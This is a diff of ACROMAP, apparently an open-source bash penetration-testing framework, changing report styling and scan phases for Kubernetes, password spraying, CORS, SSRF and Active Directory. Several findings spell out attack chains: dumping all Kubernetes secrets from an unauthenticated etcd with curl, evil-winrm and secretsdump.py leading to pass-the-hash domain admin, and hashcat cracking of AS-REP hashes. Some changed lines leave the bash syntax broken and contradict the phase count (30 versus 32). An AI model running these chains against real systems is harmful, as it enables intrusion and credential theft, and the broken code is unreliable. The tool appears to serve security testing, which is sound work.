-                echo "  [EXPLOIT PROOF] : ${exploit}"
-            fi
-            if [[ -n "$patch" ]]; then
-                echo "  [PATCH DIRECTIVE] : ${patch}"
-            fi
-            echo "═════════════════════════════════════════════════════════════════════"
+            [[ -n "$exploit" ]] && echo "  HOW TO EXPLOIT: ${exploit}"
+            [[ -n "$patch" ]]   && echo "  HOW TO PATCH  : ${patch}"
+            echo "  ─────────────────────────────────────────────────────────"
         done
         echo ""
         echo "═══════════════════════════════════════════════════════════════════"
@@ -4262,10 +4274,6 @@ phase_report() {
         echo "  \"target\": \"${TARGET}\","
         echo "  \"scan_profile\": \"${SCAN_PROFILE}\","
         echo "  \"date\": \"$(date -Iseconds)\","
-        echo "  \"metadata\": {"
-        echo "    \"false_positives_filtered\": true,"
-        echo "    \"confidence_guarantee\": \"100% Confirmed Exploitability\""
-        echo "  },"
         echo "  \"confidence\": \"${confidence}/10\","
         echo "  \"summary\": {"
         echo "    \"critical\": ${CRITICAL_COUNT},"
@@ -4339,75 +4347,66 @@ phase_report() {
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-:root{--green:#00ff88;--red:#ff3860;--orange:#ff6b35;--yellow:#ffd700;--cyan:#00d4ff;--purple:#bf5af2;--bg2:rgba(17,17,24,0.7);--bg3:rgba(26,26,36,0.6);--glass-border:rgba(0,212,255,0.15)}
-body{background:#050508;color:#c8d6e5;font-family:'Share Tech Mono',monospace;min-height:100vh;padding:0;background-image:radial-gradient(circle at top right, #0d1b2a, #050508 60%)}
-.header{background:linear-gradient(135deg,rgba(13,13,26,0.85) 0%,rgba(26,10,46,0.85) 100%);backdrop-filter:blur(12px);border-bottom:2px solid var(--green);padding:40px;text-align:center;box-shadow:0 10px 30px rgba(0,212,255,0.1)}
+body{background:#0a0a0f;color:#c8d6e5;font-family:'Share Tech Mono',monospace;min-height:100vh;padding:0}
+:root{--green:#00ff88;--red:#ff3860;--orange:#ff6b35;--yellow:#ffd700;--cyan:#00d4ff;--purple:#bf5af2;--bg2:#111118;--bg3:#1a1a24}
+.header{background:linear-gradient(135deg,#0d0d1a 0%,#1a0a2e 100%);border-bottom:2px solid var(--green);padding:40px;text-align:center}
 .logo{font-family:'Orbitron',sans-serif;font-size:52px;font-weight:900;background:linear-gradient(90deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:6px;text-shadow:none}
-.subtitle{color:#64748b;font-size:13px;margin-top:8px;letter-spacing:3px}
+.subtitle{color:#555;font-size:13px;margin-top:8px;letter-spacing:3px}
 .meta-bar{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:20px}
-.meta-pill{background:rgba(26,26,46,0.5);border:1px solid var(--glass-border);backdrop-filter:blur(5px);padding:6px 18px;border-radius:20px;font-size:12px;color:#cbd5e1;box-shadow:0 4px 6px rgba(0,0,0,0.3)}
-.meta-pill span{color:var(--cyan);font-weight:bold}
-.disclaimer{background:rgba(26,10,10,0.8);border:1px solid var(--red);border-radius:8px;margin:20px 40px;padding:16px;font-size:11px;color:#ff4444;text-align:center;box-shadow:0 0 15px rgba(255,56,96,0.2)}
-.main{padding:30px 40px;max-width:1400px;margin:0 auto}
-.guarantee-badge{background:rgba(0,255,136,0.05);border:1px solid var(--green);color:var(--green);padding:18px;text-align:center;border-radius:8px;font-family:'Orbitron',sans-serif;letter-spacing:2px;margin-bottom:30px;box-shadow:0 0 20px rgba(0,255,136,0.15);text-shadow:0 0 5px var(--green);font-weight:700}
-.section-title{font-family:'Orbitron',sans-serif;font-size:16px;color:var(--cyan);margin:30px 0 15px;padding-bottom:8px;border-bottom:1px solid var(--glass-border);letter-spacing:2px;text-transform:uppercase}
-.summary-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:15px;margin-bottom:30px}
-.sev-card{background:var(--bg2);border-radius:12px;padding:25px 15px;text-align:center;backdrop-filter:blur(12px);border:1px solid var(--glass-border);border-top:3px solid;box-shadow:0 8px 32px rgba(0,0,0,0.3);position:relative;overflow:hidden}
-.sev-card::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(180deg,rgba(255,255,255,0.03) 0%,transparent 100%);pointer-events:none}
-.sev-card.zero-day{border-color:#cc00ff;box-shadow:0 0 20px #cc00ff88;animation:pulse-zd 1.4s infinite}.sev-card.one-click{border-color:#ff0055;box-shadow:0 0 15px #ff005566}.sev-card.critical{border-color:#ff3860}.sev-card.high{border-color:#ff6b35}.sev-card.medium{border-color:#ffd700}.sev-card.low{border-color:var(--cyan)}.sev-card.info{border-color:#888}
+.meta-pill{background:#1a1a2e;border:1px solid #333;padding:6px 18px;border-radius:20px;font-size:12px;color:#aaa}
+.meta-pill span{color:var(--cyan)}
+.disclaimer{background:#1a0a0a;border:1px solid var(--red);border-radius:8px;margin:20px 40px;padding:16px;font-size:11px;color:#cc4444;text-align:center}
+.main{padding:30px 40px}
+.section-title{font-family:'Orbitron',sans-serif;font-size:16px;color:var(--cyan);margin:30px 0 15px;padding-bottom:8px;border-bottom:1px solid #222;letter-spacing:2px}
+.summary-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px;margin-bottom:30px}
+.sev-card{background:var(--bg2);border-radius:10px;padding:20px;text-align:center;border-top:3px solid}
+.sev-card.zero-day{border-color:#cc00ff;box-shadow:0 0 18px #cc00ff88;animation:pulse-zd 1.4s infinite}.sev-card.one-click{border-color:#ff0055;box-shadow:0 0 12px #ff005566}.sev-card.critical{border-color:#ff3860}.sev-card.high{border-color:#ff6b35}.sev-card.medium{border-color:#ffd700}.sev-card.low{border-color:var(--cyan)}.sev-card.info{border-color:#888}
 @keyframes pulse-zd{0%,100%{box-shadow:0 0 18px #cc00ff88}50%{box-shadow:0 0 32px #cc00ffcc}}
-.sev-count{font-family:'Orbitron',sans-serif;font-size:42px;font-weight:700;margin-bottom:5px}
-.sev-label{font-size:12px;color:#94a3b8;letter-spacing:2px;font-weight:bold}
+.sev-count{font-family:'Orbitron',sans-serif;font-size:36px;font-weight:700}
+.sev-label{font-size:11px;color:#777;margin-top:5px;letter-spacing:2px}
 .zero-day .sev-count{color:#cc00ff;text-shadow:0 0 10px #cc00ff}.one-click .sev-count{color:#ff0055}.critical .sev-count{color:#ff3860}.high .sev-count{color:#ff6b35}.medium .sev-count{color:#ffd700}.low .sev-count{color:var(--cyan)}.info .sev-count{color:#888}
-.confidence-box{background:var(--bg2);backdrop-filter:blur(12px);border:1px solid var(--glass-border);border-radius:12px;padding:25px;margin-bottom:30px;display:flex;align-items:center;gap:25px;box-shadow:0 8px 32px rgba(0,0,0,0.3)}
-.conf-score{font-family:'Orbitron',sans-serif;font-size:54px;font-weight:900;color:var(--green);text-shadow:0 0 10px rgba(0,255,136,0.3)}
+.confidence-box{background:var(--bg2);border:1px solid #333;border-radius:10px;padding:20px;margin-bottom:25px;display:flex;align-items:center;gap:20px}
+.conf-score{font-family:'Orbitron',sans-serif;font-size:48px;font-weight:900;color:var(--green)}
 .conf-bar{flex:1}
-.conf-label{font-size:13px;color:#cbd5e1;margin-bottom:10px;font-weight:bold;letter-spacing:1px}
-.conf-track{background:rgba(0,0,0,0.5);border-radius:6px;height:12px;overflow:hidden;box-shadow:inset 0 1px 3px rgba(0,0,0,0.5)}
-.conf-fill{height:100%;border-radius:6px;background:linear-gradient(90deg,var(--green),var(--cyan));transition:width 1s cubic-bezier(0.1,0.7,0.1,1);box-shadow:0 0 10px rgba(0,255,136,0.5)}
-.finding-card{background:var(--bg2);backdrop-filter:blur(12px);border:1px solid var(--glass-border);border-left:4px solid;border-radius:8px;margin-bottom:15px;overflow:hidden;box-shadow:0 4px 15px rgba(0,0,0,0.2);transition:transform 0.2s}
-.finding-card:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,0,0,0.3)}
-.finding-card.CRITICAL{border-left-color:#ff0055}.finding-card.HIGH{border-left-color:#ff6b35}.finding-card.MEDIUM{border-left-color:#ffd700}.finding-card.LOW{border-left-color:var(--cyan)}.finding-card.INFO{border-left-color:#555}
-.finding-header{padding:16px 20px;cursor:pointer;display:flex;align-items:center;gap:15px;background:rgba(255,255,255,0.02)}
-.finding-header:hover{background:rgba(255,255,255,0.05)}
-.sev-badge{font-size:11px;font-weight:700;padding:4px 12px;border-radius:4px;letter-spacing:1px;text-shadow:none}
+.conf-label{font-size:12px;color:#888;margin-bottom:8px}
+.conf-track{background:#222;border-radius:4px;height:12px;overflow:hidden}
+.conf-fill{height:100%;border-radius:4px;background:linear-gradient(90deg,var(--green),var(--cyan));transition:width .5s}
+.finding-card{background:var(--bg2);border-left:4px solid;border-radius:6px;margin-bottom:12px;overflow:hidden}
+.finding-card.CRITICAL{border-color:#ff0055}.finding-card.HIGH{border-color:#ff6b35}.finding-card.MEDIUM{border-color:#ffd700}.finding-card.LOW{border-color:var(--cyan)}.finding-card.INFO{border-color:#555}
+.finding-header{padding:14px 18px;cursor:pointer;display:flex;align-items:center;gap:12px;background:rgba(255,255,255,.02)}
+.finding-header:hover{background:rgba(255,255,255,.05)}
+.sev-badge{font-size:10px;font-weight:700;padding:3px 10px;border-radius:3px;letter-spacing:1px}
 .badge-zero-day{background:#cc00ff;color:#fff;text-shadow:0 0 6px #fff;animation:pulse-zd 1.4s infinite}.badge-one-click{background:#ff0055;color:#fff}.badge-ZERO_DAY{background:#cc00ff;color:#fff;animation:pulse-zd 1.4s infinite}.badge-ONE_CLICK{background:#ff0055;color:#fff}.badge-ZERO-DAY{background:#cc00ff;color:#fff}.badge-ONE-CLICK{background:#ff0055;color:#fff}.badge-CRITICAL{background:#ff3860;color:#fff}.badge-HIGH{background:#ff6b35;color:#fff}.badge-MEDIUM{background:#ffd700;color:#000}.badge-LOW{background:var(--cyan);color:#000}.badge-INFO{background:#555;color:#fff}
-.finding-title{font-size:15px;font-weight:600;flex:1;color:#f1f5f9}
-.finding-body{padding:0 20px;max-height:0;overflow:hidden;transition:max-height 0.4s ease,padding 0.4s ease;background:rgba(0,0,0,0.2)}
-.finding-body.open{max-height:1000px;padding:20px}
-.finding-row{display:flex;gap:15px;margin-bottom:12px;font-size:13px;line-height:1.5}
-.finding-row .lbl{color:#94a3b8;min-width:120px;font-weight:bold}
-.finding-row .val{color:#e2e8f0;word-break:break-all}
-.exploit-row, .patch-row{background:#000;border:1px solid #333;border-radius:6px;padding:15px;margin-top:15px;display:block}
-.exploit-row .lbl, .patch-row .lbl{display:block;margin-bottom:8px;font-family:'Orbitron',sans-serif;letter-spacing:1px}
-.exploit-row .lbl{color:#ff3860}
-.patch-row .lbl{color:var(--green)}
-.exploit-row .val{color:#00ff00;font-family:monospace;display:block;word-break:normal;white-space:pre-wrap}
-.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:15px;margin-bottom:25px}
-.info-card{background:var(--bg2);backdrop-filter:blur(8px);border-radius:10px;padding:18px;border:1px solid var(--glass-border);box-shadow:0 4px 12px rgba(0,0,0,0.2)}
-.info-card .ik{font-size:12px;color:#94a3b8;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px}
-.info-card .iv{color:var(--cyan);font-size:14px;word-break:break-all;font-weight:bold}
-.attack-chain{background:rgba(13,15,26,0.8);backdrop-filter:blur(10px);border:1px solid rgba(0,212,255,0.2);border-radius:12px;padding:25px;margin-bottom:25px;box-shadow:0 8px 24px rgba(0,0,0,0.3)}
-.chain-title{color:var(--orange);font-size:14px;margin-bottom:15px;font-family:'Orbitron',sans-serif;letter-spacing:1px;text-shadow:0 0 5px rgba(255,107,53,0.3)}
-.chain-step{display:flex;gap:15px;margin-bottom:12px;font-size:13px;align-items:flex-start;color:#cbd5e1}
-.chain-num{background:var(--orange);color:#000;min-width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:12px;box-shadow:0 0 8px rgba(255,107,53,0.4)}
-footer{text-align:center;padding:40px;color:#64748b;font-size:12px;border-top:1px solid var(--glass-border);margin-top:40px}
-footer a{color:var(--cyan);text-decoration:none}
-footer a:hover{text-shadow:0 0 5px var(--cyan)}
-@media(max-width:768px){.main{padding:15px}.logo{font-size:36px}}
+.finding-title{font-size:14px;font-weight:600;flex:1}
+.finding-body{padding:0 18px;max-height:0;overflow:hidden;transition:max-height .3s,padding .3s}
+.finding-body.open{max-height:400px;padding:14px 18px}
+.finding-row{display:flex;gap:10px;margin-bottom:8px;font-size:12px}
+.finding-row .lbl{color:#555;min-width:110px}
+.finding-row .val{color:#ccc;word-break:break-all}
+.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-bottom:20px}
+.info-card{background:var(--bg2);border-radius:8px;padding:16px;border:1px solid #222}
+.info-card .ik{font-size:11px;color:#555;margin-bottom:4px}
+.info-card .iv{color:var(--cyan);font-size:13px;word-break:break-all}
+.attack-chain{background:#0d0f1a;border:1px solid #1a2a3a;border-radius:8px;padding:20px;margin-bottom:20px}
+.chain-title{color:var(--orange);font-size:13px;margin-bottom:12px;font-family:'Orbitron',sans-serif}
+.chain-step{display:flex;gap:12px;margin-bottom:8px;font-size:12px;align-items:flex-start}
+.chain-num{background:var(--orange);color:#000;min-width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:11px}
+footer{text-align:center;padding:30px;color:#333;font-size:11px;border-top:1px solid #111}
+footer a{color:#555;text-decoration:none}
+@media(max-width:600px){.main{padding:15px}.logo{font-size:32px}.summary-grid{grid-template-columns:repeat(2,1fr)}}
 </style>
 </head>
 <body>
 <div class="header">
   <div class="logo">ACROMAP</div>
-  <div class="subtitle">v5.0 &nbsp;|&nbsp; 32-PHASE DEEP PENETRATION TEST REPORT</div>
+  <div class="subtitle">v5.0 &nbsp;|&nbsp; 30-PHASE DEEP PENETRATION TEST REPORT</div>
   <div class="meta-bar">
     <div class="meta-pill">Target: <span>${TARGET}</span></div>
     <div class="meta-pill">Type: <span>${TARGET_TYPE}</span></div>
     <div class="meta-pill">Profile: <span>${SCAN_PROFILE}</span></div>
     <div class="meta-pill">Date: <span>${now_str}</span></div>
     <div class="meta-pill">Duration: <span>$(( total_elapsed/60 ))m $(( total_elapsed%60 ))s</span></div>
-    <div class="meta-pill">Phases: <span>${PHASES_COMPLETED}/32</span></div>
+    <div class="meta-pill">Phases: <span>${PHASES_COMPLETED}/30</span></div>
   </div>
 </div>
 <div class="disclaimer">
@@ -4416,7 +4415,6 @@ footer a:hover{text-shadow:0 0 5px var(--cyan)}
   ACROMAP is open-source and free for all — use responsibly.
 </div>
 <div class="main">
-  <div class="guarantee-badge">✔ VERIFIED FINDINGS — MULTI-TOOL CORRELATION</div>
 HTMLHEAD
 
         # Summary cards
@@ -4435,7 +4433,7 @@ HTMLHEAD
         echo "  <div class=\"conf-bar\">"
         echo "    <div class=\"conf-label\">CONFIDENCE RATING — ${conf_label}</div>"
         echo "    <div class=\"conf-track\"><div class=\"conf-fill\" style=\"width:${conf_pct}%\"></div></div>"
-        echo "    <div style='font-size:11px;color:#444;margin-top:6px'>Based on ${TOOLS_SUCCEEDED}/${TOOLS_ATTEMPTED} tools succeeded, ${PHASES_COMPLETED}/32 phases completed, ${SCAN_PROFILE} profile</div>"
+        echo "    <div style='font-size:11px;color:#444;margin-top:6px'>Based on ${TOOLS_SUCCEEDED}/${TOOLS_ATTEMPTED} tools succeeded, ${PHASES_COMPLETED}/30 phases completed, ${SCAN_PROFILE} profile</div>"
         echo "  </div>"
         echo "</div>"
 
@@ -4625,32 +4623,31 @@ print_final_summary() {
 
     echo ""
     echo -e "${LGREEN}${BOLD}"
-    echo "  ╔════════════════════════════════════════════════════════════════════╗"
-    echo "  ║          █▀█ █▀▀ █▀█ █▀█ █▄█ █▀█ █▀█   v5.0                        ║"
-    echo "  ║          █▀█ █▄▄ █▀▄ █▄█ █ █ █▀█ █▀▀   SCAN COMPLETE               ║"
-    echo "  ╠════════════════════════════════════════════════════════════════════╣"
-    printf "  ║  Target    : %-56s║\n" "${TARGET}${cidr_info}"
-    printf "  ║  Profile   : %-56s║\n" "$SCAN_PROFILE"
-    printf "  ║  Duration  : %dm %02ds%-53s║\n" $(( total_elapsed/60 )) $(( total_elapsed%60 )) ""
-    printf "  ║  Phases    : %s/32 completed%-42s║\n" "$(( PHASES_COMPLETED > 32 ? 32 : PHASES_COMPLETED ))" ""
-    echo "  ╠════════════════════════════════════════════════════════════════════╣"
-    echo -e "  ║  \033[1;35m0DAY${LGREEN}:$(printf '%-3s' $ZERO_DAY_COUNT) \033[1;31m1CLK${LGREEN}:$(printf '%-3s' $ONE_CLICK_COUNT) ${LRED}CRIT${LGREEN}:$(printf '%-3s' $CRITICAL_COUNT) ${RED}HIGH${LGREEN}:$(printf '%-3s' $HIGH_COUNT) ${YELLOW}MED${LGREEN}:$(printf '%-3s' $MEDIUM_COUNT) ${WHITE}INFO${LGREEN}:$(printf '%-3s' $INFO_COUNT) TOTAL:${BOLD}$(printf '%-6s' $total_findings)${LGREEN} ║"
-    echo "  ╠════════════════════════════════════════════════════════════════════╣"
-    echo "  ║  [✔] VERIFIED FINDINGS — MULTI-TOOL CORRELATION                    ║"
-    echo "  ╠════════════════════════════════════════════════════════════════════╣"
-    printf "  ║  Confidence : %s/10  (%s)%-41s║\n" "$confidence" "$conf_label" ""
-    printf "  ║  Tools OK   : %s/%s%-53s║\n" "$TOOLS_SUCCEEDED" "$TOOLS_ATTEMPTED" ""
-    printf "  ║  Cloud      : %-56s║\n" "${CLOUD_DETECTED:-none detected}"
-    printf "  ║  Kubernetes : %-56s║\n" "$K8S_DETECTED"
-    echo "  ╠════════════════════════════════════════════════════════════════════╣"
-    printf "  ║  Output  : %-59s║\n" "${OUTPUT_DIR}/"
-    printf "  ║  Reports : %-59s║\n" "report.html | report.pdf | report.txt | report.json"
-    printf "  ║  MSF RC  : %-59s║\n" "${MSF_RC_FILE##*/acromap_results/}"
-    echo "  ╠════════════════════════════════════════════════════════════════════╣"
-    echo "  ║  ACROMAP — Open-source & free for all.                             ║"
-    echo "  ║  Author: acro777x  |  github.com/acro777x/acromap                  ║"
+    echo "  ╔══════════════════════════════════════════════════════════════════════╗"
+    echo "  ║          ACROMAP v5.0 — SCAN COMPLETE                  ║"
+    echo "  ║          32-Phase Deep Penetration Test Framework                  ║"
+    echo "  ╠══════════════════════════════════════════════════════════════════════╣"
+    printf "  ║  Target    : %-54s║\n" "${TARGET}${cidr_info}"
+    printf "  ║  Profile   : %-54s║\n" "$SCAN_PROFILE"
+    printf "  ║  Duration  : %dm %02ds%-51s║\n" $(( total_elapsed/60 )) $(( total_elapsed%60 )) ""
+    printf "  ║  Phases    : %s/32 completed%-40s║\n" "$(( PHASES_COMPLETED > 32 ? 32 : PHASES_COMPLETED ))" ""
+    echo "  ╠══════════════════════════════════════════════════════════════════════╣"
+    echo -e "  ║  \033[1;35m0DAY${LGREEN}:$(printf '%-3s' $ZERO_DAY_COUNT) \033[1;31m1CLK${LGREEN}:$(printf '%-3s' $ONE_CLICK_COUNT) ${LRED}CRIT${LGREEN}:$(printf '%-3s' $CRITICAL_COUNT) ${RED}HIGH${LGREEN}:$(printf '%-3s' $HIGH_COUNT) ${YELLOW}MED${LGREEN}:$(printf '%-3s' $MEDIUM_COUNT) ${WHITE}INFO${LGREEN}:$(printf '%-3s' $INFO_COUNT) TOTAL:${BOLD}$(printf '%-4s' $total_findings)${LGREEN} ║"
+    echo "  ╠══════════════════════════════════════════════════════════════════════╣"
+    printf "  ║  Confidence : %s/10  (%s)%-39s║\n" "$confidence" "$conf_label" ""
+    printf "  ║  Tools OK   : %s/%s%-51s║\n" "$TOOLS_SUCCEEDED" "$TOOLS_ATTEMPTED" ""
+    printf "  ║  Cloud      : %-54s║\n" "${CLOUD_DETECTED:-none detected}"
+    printf "  ║  Kubernetes : %-54s║\n" "$K8S_DETECTED"
+    printf "  ║  ZAP DAST   : %-54s║\n" "$ZAP_AVAILABLE"
+    echo "  ╠══════════════════════════════════════════════════════════════════════╣"
+    printf "  ║  Output  : %-57s║\n" "${OUTPUT_DIR}/"
+    printf "  ║  Reports : %-57s║\n" "report.html | report.pdf | report.txt | report.json"
+    printf "  ║  MSF RC  : %-57s║\n" "${MSF_RC_FILE##*/acromap_results/}"
+    echo "  ╠══════════════════════════════════════════════════════════════════════╣"
+    echo "  ║  ACROMAP — Open-source & free for all.                 ║"
+    echo "  ║  Author: acro777x  |  github.com/acro777x/acromap           ║"
     echo "  ║  © 2026 acro777x. NOT responsible for unauthorized use.            ║"
-    echo "  ╚════════════════════════════════════════════════════════════════════╝"
+    echo "  ╚══════════════════════════════════════════════════════════════════════╝"
     echo -e "${NC}"
 
     echo -e "  ${YELLOW}${BOLD}Immediate Next Steps:${NC}"
@@ -5234,11 +5231,11 @@ phase_k8s_audit() {
             "http://${TARGET}:2379/v2/members" || true
         if grep -qE "\"members\"|\"clientURLs\"" "${k8s_dir}/etcd_members.json" 2>/dev/null; then
             add_vuln "CRITICAL" "etcd Cluster Accessible Without Authentication" \
-                "etcd (Kubernetes backing store) is accessible on port 2379 without TLS/auth. All K8s secrets, configs, and credentials can be dumped from etcd." \
+                "etcd (Kubernetes backing store) is accessible on port 2379 without TLS/auth. All K8s secrets, configs, and credentials can be dumped from etcd." \" \
+            "EXPLOIT: curl http://TARGET:2379/v3/keys?recursive=true -> ALL K8s secrets, tokens, kubeconfig. Extract service account token -> kubectl --token=TOKEN -> cluster admin access." \
+            "PATCH: 1) Enable TLS on etcd. 2) Require client certs: --client-cert-auth=true. 3) Firewall port 2379/2380 to control plane only. 4) Rotate all K8s secrets."
                 "Enable etcd peer and client TLS. Require client certificates. Restrict etcd to localhost or control-plane network." \
-                "curl http://${TARGET}:2379/v2/members — returned cluster member data" \
-                "EXPLOIT: curl http://TARGET:2379/v3/keys?recursive=true -> ALL K8s secrets, tokens, kubeconfig. Extract service account token -> kubectl --token=TOKEN -> cluster admin access." \
-                "PATCH: 1) Enable TLS on etcd. 2) Require client certs: --client-cert-auth=true. 3) Firewall port 2379/2380 to control plane only. 4) Rotate all K8s secrets."
+                "curl http://${TARGET}:2379/v2/members — returned cluster member data"
         fi
     fi
 
@@ -5355,11 +5352,11 @@ phase_password_spray() {
                     "${spray_dir}/valid_users.txt" "$spray_pass" 2>/dev/null || true
                 if grep -q "SUCCESS" "${spray_dir}/kerbrute_spray.txt" 2>/dev/null; then
                     add_vuln "CRITICAL" "Kerberos Password Spray — Credentials Found" \
-                        "Password spray attack succeeded. Weak/default passwords in use on domain accounts." \
+                        "Password spray attack succeeded. Weak/default passwords in use on domain accounts." \" \
+                    "EXPLOIT: evil-winrm -i TARGET -u USER -p PASSWORD -> PS shell -> whoami /groups -> secretsdump.py DOMAIN/USER:PASS@TARGET -> NTLM hashes -> pass-the-hash -> domain admin." \
+                    "PATCH: 1) Enable Azure AD Password Protection (bans common passwords). 2) Enforce MFA. 3) Enable Smart Lockout. 4) Monitor Event ID 4625 mass failures. 5) Sentinel alert for spray patterns."
                         "Enforce strong password policy. Enable MFA. Deploy Azure AD Password Protection." \
-                        "$(grep 'SUCCESS' "${spray_dir}/kerbrute_spray.txt" | head -3)" \
-                        "EXPLOIT: evil-winrm -i TARGET -u USER -p PASSWORD -> PS shell -> whoami /groups -> secretsdump.py DOMAIN/USER:PASS@TARGET -> NTLM hashes -> pass-the-hash -> domain admin." \
-                        "PATCH: 1) Enable Azure AD Password Protection (bans common passwords). 2) Enforce MFA. 3) Enable Smart Lockout. 4) Monitor Event ID 4625 mass failures. 5) Sentinel alert for spray patterns."
+                        "$(grep 'SUCCESS' "${spray_dir}/kerbrute_spray.txt" | head -3)"
                 fi
             fi
         fi
@@ -5429,7 +5426,7 @@ phase_cors_jwt() {
         _is_valid_url "$web_url" || continue
         local slug; slug=$(echo "$web_url" | sed 's|[/:.]|_|g')
         for origin in "${cors_origins[@]}"; do
-            local cors_resp; cors_resp=$(curl -s -I -X GET --max-time 10 \
+            local cors_resp; cors_resp=$(curl -s -X GET --max-time 10 \
                 -H "Origin: ${origin}" \
                 -H "Access-Control-Request-Method: GET" \
                 "$web_url" 2>/dev/null || echo "")
@@ -5463,6 +5460,20 @@ phase_cors_jwt() {
             fi
         done
 
+        # Check for Access-Control-Allow-Origin: * with credentials (always wrong)
+        local acao_star; acao_star=$(curl -s -I --max-time 10 \
+            -H "Origin: https://evil.com" "$web_url" 2>/dev/null \
+            | grep -i "Access-Control-Allow-Origin:.*\*" | head -1 || echo "")
+        local acac_true2; acac_true2=$(curl -s -I --max-time 10 \
+            -H "Origin: https://evil.com" "$web_url" 2>/dev/null \
+            | grep -i "Access-Control-Allow-Credentials.*true" | head -1 || echo "")
+        if [[ -n "$acao_star" && -n "$acac_true2" ]]; then
+            add_vuln "CRITICAL" "CORS Wildcard + Credentials — Impossible Combination (${web_url})" \
+                "Server sets Access-Control-Allow-Origin: * AND Access-Control-Allow-Credentials: true. This combination is rejected by browsers but indicates severe CORS misconfiguration." \
+                "Remove wildcard ACAO when credentials are required. Use specific origin allowlist." \
+                "ACAO: * and ACAC: true detected — browsers block this but config is dangerously wrong"
+        fi
+
         # Check for missing CORS Vary header (cache poisoning risk)
         local vary; vary=$(curl -s -I --max-time 10 "$web_url" 2>/dev/null \
             | grep -i "^Vary:" | tr -d '\r' | head -1 || echo "")
@@ -5470,7 +5481,7 @@ phase_cors_jwt() {
             -H "Origin: https://trusted.com" "$web_url" 2>/dev/null \
             | grep -i "Access-Control-Allow-Origin" | tr -d '\r' | head -1 || echo "")
         if [[ -n "$acao_check" ]] && ! echo "$vary" | grep -qi "Origin"; then
-            add_vuln "MEDIUM" "CORS Response Missing Vary: Origin Header (${web_url})" \
+            add_vuln "LOW" "CORS Response Missing Vary: Origin Header (${web_url})" \
                 "CORS responses do not include Vary: Origin, enabling CORS cache poisoning attacks." \
                 "Add 'Vary: Origin' to all CORS responses." \
                 "ACAO present but Vary: Origin absent"
@@ -5542,8 +5553,8 @@ phase_cors_jwt() {
 
                 # Check for weak HMAC secret (HS256 with common secrets)
                 if echo "$jwt_header" | grep -qiE '"alg"\s*:\s*"HS'; then
-                    add_vuln "INFO" "JWT HS256/HS512 Detected — Verify Secret Strength (${web_url})" \
-                        "HMAC-signed JWT detected. Weak secrets can be brute-forced offline with hashcat or jwt-cracker." \
+                    add_vuln "LOW" "JWT HS256/HS512 Detected — Verify Secret Strength (${web_url})" \
+                        "HMAC-signed JWT detected. Weak secrets (< 256 bits) can be brute-forced offline using hashcat mode 16500 or jwt-cracker. Production JWTs should use RS256/ES256 with asymmetric keys." \
                         "Use strong random secrets (256+ bits). Prefer asymmetric RS256/ES256 for APIs." \
                         "JWT header: ${jwt_header}"
                 fi
@@ -5640,12 +5651,6 @@ phase_ssrf_deep() {
         local -a internal_ports=(22 80 443 3306 5432 6379 8080 8443 27017 9200)
         local timing_hits=()
         # Portable millisecond timer (date +%s%3N not available on all distros)
-        local t_ctrl_start; t_ctrl_start=$(python3 -c "import time; print(int(time.time()*1000))" 2>/dev/null || date +%s%3N 2>/dev/null || echo 0)
-        curl -s --max-time 1 "${web_url}?url=http://127.0.0.1:1" -o /dev/null 2>/dev/null || true
-        local t_ctrl_end; t_ctrl_end=$(python3 -c "import time; print(int(time.time()*1000))" 2>/dev/null || date +%s%3N 2>/dev/null || echo 0)
-        local ctrl_elapsed=$(( t_ctrl_end - t_ctrl_start ))
-        [[ $ctrl_elapsed -eq 0 ]] && ctrl_elapsed=10
-
         for iport in "${internal_ports[@]}"; do
             local t_start; t_start=$(python3 -c "import time; print(int(time.time()*1000))" 2>/dev/null \
                 || date +%s%3N 2>/dev/null || echo 0)
@@ -5655,9 +5660,8 @@ phase_ssrf_deep() {
             local t_end; t_end=$(python3 -c "import time; print(int(time.time()*1000))" 2>/dev/null \
                 || date +%s%3N 2>/dev/null || echo 0)
             local elapsed=$(( t_end - t_start ))
-            
-            # Relative timing: if the queried port takes significantly longer than the closed control port (filtered) 
-            # or differs by more than 50ms (open vs closed behavior), flag it.
+            # Relative timing: port open = fast (connection refused immediate)
+            # port closed/filtered = slow (timeout). Compare to control baseline.
             local diff=$(( elapsed - ctrl_elapsed ))
             if [[ ${diff#-} -gt 50 && $elapsed -ge 0 ]]; then
                 timing_hits+=("127.0.0.1:${iport}(${elapsed}ms)")
@@ -5933,11 +5937,11 @@ phase_ad_deep() {
         if grep -qE "\$krb5asrep\$" "${ad_dir}/asrep.txt" 2>/dev/null; then
             local asrep_count; asrep_count=$(( $(grep -c "\$krb5asrep\$" "${ad_dir}/asrep.txt" 2>/dev/null || echo 0) + 0 ))
             add_vuln "CRITICAL" "AS-REP Roastable Accounts Found (${asrep_count})" \
-                "Accounts with Kerberos pre-authentication disabled. AS-REP hashes obtainable without credentials — crackable offline." \
-                "Enable pre-authentication on all accounts. Audit DONT_REQ_PREAUTH flag. Apply strong passwords." \
-                "$(grep -oE 'User:[[:space:]]*[^[:space:]]+' "${ad_dir}/asrep.txt" | grep -oE '[^[:space:]]+$' | head -5 | tr '\n' ' ')" \
+                "Accounts with Kerberos pre-authentication disabled. AS-REP hashes obtainable without credentials — crackable offline." \" \
                 "EXPLOIT: hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -> cracked plaintext password -> evil-winrm or SMB lateral movement -> escalate to domain admin via ACL abuse or Kerberoasting." \
